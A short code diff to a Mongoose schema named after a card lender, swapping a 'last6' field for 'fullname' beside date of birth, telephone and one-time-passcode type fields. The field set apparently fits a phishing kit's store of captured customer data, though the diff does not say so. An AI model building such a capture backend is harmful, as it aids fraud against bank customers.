@@ -2,7 +2,7 @@ const mongoose = require("mongoose");
 
 const vanquisSchema = new mongoose.Schema({
   uniqueid: Number,
-  last6: String,
+  fullname: String,
   dob: String,
   telephone: String,
   otpType: String,
